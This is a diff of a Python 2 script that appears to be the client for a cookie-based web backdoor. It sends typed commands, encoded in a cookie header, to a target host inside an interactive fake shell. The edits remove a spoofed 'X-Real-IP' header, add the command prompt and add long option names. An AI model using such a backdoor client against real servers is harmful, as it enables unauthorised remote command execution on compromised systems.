@@ -80,7 +80,6 @@ def Error():
 def backcookie(command, host, cookie, vcmd):
 	headers = {
 	           core.ua: 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0', 
-	           'X-Real-IP': '1.1.1.1',
 	           core.ck: cookie + '=' + command.encode(core.eb)
 	          }
 	try:
@@ -137,7 +136,8 @@ def shell(host, cookie):
 			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Cookie: " + core.cl['blue'] + cookie + core.cl['white'])
 			go(core.cl['yellow'] + "[!] " + core.cl['green']  + "Command: " + core.cl['blue'] + command.encode(core.eb) + core.cl['white'])
 			go("\n")
-			
+
+		command = raw_input(nick + "@" + domain + ":~$ ")
 		if command != "exit": # exit console backcookie
 			backcookie(command, host, cookie, "command")
 		else:
@@ -152,8 +152,8 @@ def shell(host, cookie):
 
 def main():
 	parser = optparse.OptionParser("python" + " " + "%prog -u <<URL>> -c <<Cookie>>", version="1.0.2")
-	parser.add_option('-u', dest="Url", type="string", help="specify hostname to run on")
-	parser.add_option('-c', dest="Cookie", type="string", help="specify Cookie")
+	parser.add_option("-u", "--url", dest="Url", type="string", help="specify hostname to run on")
+	parser.add_option("-c", "--cookie", dest="Cookie", type="string", help="specify Cookie")
 	(options, args) = parser.parse_args()
 	host = options.Url
 	cookie = options.Cookie
@@ -167,7 +167,7 @@ if __name__ == "__main__":
         try:
         	main()
         except KeyboardInterrupt:
-        	close(core.cl['blue'] + "\n\n[-] " + core.cl['green'] + "Status: " + core.cl['red'] + "close!\n" + core.cl['white']) # Ctrl + c = close
+        	close(core.cl['blue'] + "\n\n[-] " + core.cl['green'] + "Status: " + core.cl['red'] + "close!\n" + core.cl['white']) #Ctrl + c = close
                 pass
         except Exception as ke:
         	close(core.cl['red'] + "Error: " + core.cl['blue'] + "%s" % ke + core.cl['white']) # Result of error
